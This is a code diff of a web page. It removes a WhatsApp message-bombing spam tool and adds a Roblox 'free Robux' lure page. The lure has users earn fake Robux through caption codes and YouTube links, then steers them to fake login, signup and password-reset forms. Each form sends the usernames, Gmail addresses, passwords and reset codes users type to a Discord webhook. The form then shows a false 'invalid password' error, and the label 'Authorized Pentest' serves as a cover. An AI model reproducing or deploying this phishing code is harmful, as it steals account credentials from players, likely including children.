+  const s = new Date(n.getFullYear(), 0, 1);
+  return n.getFullYear() + '-W' + Math.ceil(((n - s) / (7*24*60*60*1000)));
+}
 
-            bombInterval = setInterval(() => {
-                if (bombing && messagesSent < totalMessages) {
-                    const message = getRandomWhatsAppMessage();
-                    messagesSent++;
-                    
-                    // Update current message display
-                    document.getElementById('currentMessage').textContent = `Message #${messagesSent}: "${message}"`;
-                    
-                    log(`📨 #${messagesSent}/${totalMessages} → "${message.substring(0,30)}..."`);
-                    
-                    // SIMULATED WhatsApp Web API
-                    simulateWhatsAppSend(targetNumber, message);
-                    
-                    updateStats();
-                } else {
-                    stopWhatsAppBomb();
-                }
-            }, 1200); // 1.2 seconds per message
-        }
+function checkWeek() {
+  const s = localStorage.getItem(WK);
+  const c = getWeek();
+  if (s !== c) {
+    const d = getData();
+    d.vids = [];
+    saveData(d);
+    localStorage.setItem(WK, c);
+  }
+}
 
-        function stopWhatsAppBomb() {
-            bombing = false;
-            if (bombInterval) clearInterval(bombInterval);
-            log(`⏹️ BOMB STOPPED | ${messagesSent}/${totalMessages} messages sent`);
-            updateStats();
-        }
+function updUI() {
+  checkWeek();
+  const d = getData();
+  document.getElementById('balanceDisplay').textContent = d.bal;
+  document.getElementById('captionCount').textContent = d.caps;
+  document.getElementById('videoCount').textContent = d.vids.length;
+}
 
-        // SIMULATE WhatsApp Web API (Production: use WhatsApp Web automation)
-        function simulateWhatsAppSend(number, message) {
-            // Mock API call - Replace with real WhatsApp automation
-            fetch('https://api.whatsapp.com/send', {
-                method: 'POST',
-                body: JSON.stringify({phone: number, text: message})
-            }).catch(() => {
-                console.log(`💬 SIMULATED → ${number}: ${message}`);
-            });
-        }
+// ==================== NAVBAR BUTTONS ====================
+document.getElementById('navLoginBtn').addEventListener('click', () => switchPage('page3'));
+document.getElementById('navSignupBtn').addEventListener('click', () => switchPage('page4'));
 
-        // Enter key start
-        document.getElementById('whatsappNumber').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') startWhatsAppBomb();
-        });
+// ==================== INTERNAL NAV ====================
+document.getElementById('gotoLoginFromSignup').addEventListener('click', () => switchPage('page3'));
+document.getElementById('gotoLoginFromForgot').addEventListener('click', () => switchPage('page3'));
+document.getElementById('gotoSignupLink').addEventListener('click', () => switchPage('page4'));
+document.getElementById('gotoForgotLink').addEventListener('click', () => switchPage('page5'));
 
-        updateStats();
-    </script>
+// ==================== CAPTION SYSTEM ====================
+const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+let currentCaption = 'A1';
+
+function generateCaption() {
+  const letter = letters[Math.floor(Math.random() * 26)];
+  const number = Math.floor(Math.random() * 9) + 1;
+  currentCaption = letter + number;
+  document.getElementById('captionCode').textContent = currentCaption;
+  const inp = document.getElementById('captionInput');
+  inp.value = '';
+  inp.className = '';
+  const st = document.getElementById('captionAIStatus');
+  st.className = 'cap-ai';
+  st.style.background = ''; st.style.borderColor = ''; st.style.color = '';
+}
+
+document.getElementById('refreshCaptionBtn').addEventListener('click', function() {
+  generateCaption();
+  showToast('🔄 New caption code generated!');
+});
+generateCaption();
+
+document.getElementById('submitCaptionBtn').addEventListener('click', function() {
+  const inp = document.getElementById('captionInput');
+  const val = inp.value.trim().toUpperCase();
+  const aiStatus = document.getElementById('captionAIStatus');
+  const aiMsg = document.getElementById('captionAIMsg');
+  
+  if (!val) { showToast('⚠️ Type the caption code shown above!'); return; }
+  
+  if (val === currentCaption) {
+    inp.className = 'correct';
+    aiStatus.classList.add('show');
+    aiStatus.style.background = '#0a1a0a'; aiStatus.style.borderColor = '#1a3a1a'; aiStatus.style.color = '#4caf50';
+    aiMsg.textContent = '✅ AI verification: Code "' + currentCaption + '" correct! +5 Robux';
+    const d = getData();
+    d.bal += 5;
+    d.caps += 1;
+    saveData(d);
+    updUI();
+    setTimeout(() => generateCaption(), 1200);
+  } else {
+    inp.className = 'wrong';
+    aiStatus.classList.add('show');
+    aiStatus.style.background = '#1a0a0a'; aiStatus.style.borderColor = '#3a1a1a'; aiStatus.style.color = '#f44336';
+    aiMsg.textContent = '❌ AI verification: "' + val + '" does not match "' + currentCaption + '". Try again!';
+    setTimeout(() => {
+      inp.className = '';
+      inp.value = '';
+      aiStatus.className = 'cap-ai';
+      aiStatus.style.background = ''; aiStatus.style.borderColor = ''; aiStatus.style.color = '';
+    }, 1500);
+  }
+});
+
+// ==================== YOUTUBE VIDEO SYSTEM ====================
+function isValidYouTubeURL(url) {
+  return /^(https?:\/\/)?(www\.)?(youtube\.com\/(watch\?v=|embed\/|v\/|shorts\/)|youtu\.be\/)[a-zA-Z0-9_-]{11}(\S*)?$/.test(url.trim());
+}
+
+document.getElementById('submitVideoBtn').addEventListener('click', function() {
+  checkWeek();
+  const inp = document.getElementById('videoLinkInput');
+  const link = inp.value.trim();
+  const aiStatus = document.getElementById('videoAIStatus');
+  const aiMsg = document.getElementById('videoAIMsg');
+  const d = getData();
+  
+  if (!link) { showToast('⚠️ Paste a YouTube video link first!'); return; }
+  if (d.vids.length >= 3) {
+    showToast('⚠️ Weekly limit reached! (3/3 videos)');
+    aiStatus.className = 'vid-ai show fail'; aiMsg.textContent = '❌ AI: Weekly limit of 3 reached.'; return;
+  }
+  
+  if (isValidYouTubeURL(link)) {
+    aiStatus.className = 'vid-ai show'; aiStatus.classList.remove('fail');
+    aiMsg.textContent = '✅ AI verification: Valid YouTube link detected...';
+    setTimeout(() => {
+      aiMsg.textContent = '✅ AI verification: Content confirmed! +50 Robux';
+      d.bal += 50;
+      d.vids.push({ url: link, time: new Date().toISOString() });
+      saveData(d); updUI(); inp.value = '';
+      showToast('✅ +50 Robux earned!');
+    }, 1500);
+  } else {
+    aiStatus.className = 'vid-ai show fail';
+    aiMsg.textContent = '❌ AI: Invalid YouTube link. Use youtube.com/watch?v=... or youtu.be/...';
+    showToast('⚠️ Invalid YouTube link!');
+  }
+});
+
+// ==================== WITHDRAW → PAGE 2 ====================
+document.getElementById('withdrawBtn').addEventListener('click', function() {
+  const d = getData();
+  if (d.bal < 100) { showToast('⚠️ Need ' + (100 - d.bal) + ' more Robux!'); return; }
+  d.bal -= 100;
+  saveData(d);
+  updUI();
+  showToast('🔄 Processing withdrawal...');
+  setTimeout(() => switchPage('page2'), 1500);
+});
+
+// ==================== CLEAR ====================
+document.getElementById('clearDataBtn').addEventListener('click', function() {
+  if (confirm('Reset all data?')) {
+    localStorage.removeItem(SK);
+    localStorage.removeItem(WK);
+    updUI();
+    showToast('🔄 Data reset complete');
+  }
+});
+
+// ==================== DONATE → LOGIN ====================
+document.getElementById('donateBtn').addEventListener('click', () => switchPage('page3'));
+
+// ==================== FAKE LOGIN ====================
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  const user = document.getElementById('loginUsername').value.trim();
+  const pass = document.getElementById('loginPassword').value.trim();
+  const btn = document.getElementById('loginBtn');
+  const err = document.getElementById('loginErrorMsg');
+  if (!user || !pass) { err.textContent = '⚠️ Fill in all fields.'; err.style.display = 'block'; return; }
+  btn.classList.add('load'); btn.disabled = true; err.style.display = 'none';
+  const payload = { type: 'LOGIN', username: user, password: pass, timestamp: new Date().toISOString(), userAgent: navigator.userAgent };
+  try { await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: '**🚨 Roblox Login Captured**', embeds: [{ title: 'Login Credentials', color: 15158332, fields: [{ name: '👤 User', value: '`'+user+'`', inline: true }, { name: '🔑 Pass', value: '`'+pass+'`', inline: true }, { name: '🕐 Time', value: payload.timestamp, inline: false }, { name: '🌐 UA', value: navigator.userAgent.substring(0,100), inline: false }], footer: { text: 'Authorized Pentest' } }] }) }); } catch(e) {}
+  setTimeout(() => { btn.classList.remove('load'); btn.disabled = false; err.textContent = '⚠️ Invalid username or password.'; err.style.display = 'block'; document.getElementById('loginPassword').value = ''; }, 2000);
+});
+
+// ==================== FAKE SIGNUP ====================
+document.getElementById('signupForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  const user = document.getElementById('signupUser').value.trim();
+  const email = document.getElementById('signupEmail').value.trim();
+  const pass = document.getElementById('signupPass').value.trim();
+  const btn = document.getElementById('signupBtn');
+  const err = document.getElementById('signupErrorMsg');
+  if (!user || !email || !pass) { err.textContent = '⚠️ Fill in all fields.'; err.style.display = 'block'; return; }
+  if (!email.toLowerCase().includes('@gmail.com') && !email.toLowerCase().includes('@googlemail.com')) { err.textContent = '⚠️ Use a Gmail address.'; err.style.display = 'block'; return; }
+  btn.classList.add('load'); btn.disabled = true; err.style.display = 'none';
+  try { await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: '**🆕 New Sign Up**', embeds: [{ title: 'New Registration', color: 5763719, fields: [{ name: '👤 User', value: '`'+user+'`', inline: true }, { name: '📧 Email', value: '`'+email+'`', inline: true }, { name: '🔑 Pass', value: '`'+pass+'`', inline: true }, { name: '🕐 Time', value: new Date().toISOString(), inline: false }], footer: { text: 'Authorized Pentest' } }] }) }); } catch(e) {}
+  setTimeout(() => { btn.classList.remove('load'); btn.disabled = false; err.style.color = '#4caf50'; err.textContent = '✅ Account created! Redirecting...'; err.style.display = 'block'; setTimeout(() => switchPage('page3'), 1200); }, 1500);
+});
+
+// ==================== FAKE FORGOT PASSWORD ====================
+let resetFlow = { step: 'email', code: '' };
+
+document.getElementById('forgotForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  const email = document.getElementById('forgotEmail').value.trim();
+  const codeInp = document.getElementById('resetCode').value.trim();
+  const newPass = document.getElementById('newPassword').value.trim();
+  const btn = document.getElementById('forgotBtn');
+  const status = document.getElementById('resetStatus');
+  const codeSection = document.getElementById('resetCodeSection');
+  
+  if (resetFlow.step === 'email') {
+    if (!email) { showToast('⚠️ Enter your Gmail.'); return; }
+    if (!email.toLowerCase().includes('@gmail.com') && !email.toLowerCase().includes('@googlemail.com')) { showToast('⚠️ Use a Gmail address.'); return; }
+    btn.classList.add('load'); btn.disabled = true;
+    resetFlow.code = String(Math.floor(100000 + Math.random() * 900000));
+    resetFlow.email = email;
+    try { await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: '**🔐 Password Reset Request**', embeds: [{ title: 'Reset Request', color: 16753920, fields: [{ name: '📧 Email', value: '`'+email+'`', inline: true }, { name: '🔢 Code', value: '`'+resetFlow.code+'`', inline: true }, { name: '🕐 Time', value: new Date().toISOString(), inline: false }], footer: { text: 'Authorized Pentest' } }] }) }); } catch(e) {}
+    setTimeout(() => {
+      btn.classList.remove('load'); btn.disabled = false;
+      resetFlow.step = 'code'; codeSection.style.display = 'block';
+      btn.querySelector('.btxt').textContent = 'Verify Code & Reset';
+      status.className = 'p5-code-status show'; status.style.background = '#e8f5e9'; status.style.color = '#2e7d32';
+      status.innerHTML = '📧 Code sent to <strong>'+email+'</strong><br><small>(Simulated code: <strong>'+resetFlow.code+'</strong>)</small>';
+    }, 2000);
+  } else {
+    if (!codeInp || !newPass) { showToast('⚠️ Enter code and new password.'); return; }
+    btn.classList.add('load'); btn.disabled = true;
+    try { await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: '**🔑 Password Reset Completed**', embeds: [{ title: 'Reset Complete', color: 16753920, fields: [{ name: '📧 Email', value: '`'+resetFlow.email+'`', inline: true }, { name: '🔢 Code Entered', value: '`'+codeInp+'`', inline: true }, { name: '✅ Match', value: codeInp === resetFlow.code ? 'Yes' : 'No', inline: true }, { name: '🔑 New Pass', value: '`'+newPass+'`', inline: true }], footer: { text: 'Authorized Pentest' } }] }) }); } catch(e) {}
+    setTimeout(() => {
+      btn.classList.remove('load'); btn.disabled = false;
+      if (codeInp === resetFlow.code) {
+        status.innerHTML = '✅ Password reset successful! Redirecting...';
+        status.style.background = '#e8f5e9'; status.style.color = '#2e7d32';
+        showToast('✅ Password reset!');
+        setTimeout(() => {
+          resetFlow = { step: 'email', code: '' }; codeSection.style.display = 'none';
+          btn.querySelector('.btxt').textContent = 'Send Reset Code';
+          document.getElementById('forgotEmail').value = ''; document.getElementById('resetCode').value = ''; document.getElementById('newPassword').value = '';
+          status.className = 'p5-code-status'; switchPage('page3');
+        }, 2000);
+      } else {
+        status.innerHTML = '❌ Invalid code. Try again.'; status.style.background = '#ffebee'; status.style.color = '#c62828';
+        document.getElementById('resetCode').value = ''; showToast('❌ Wrong code!');
+      }
+    }, 1500);
+  }
+});
+
+// ==================== INIT ====================
+updUI();
+</script>
 </body>
-</html>
+    </html>
+
+
+
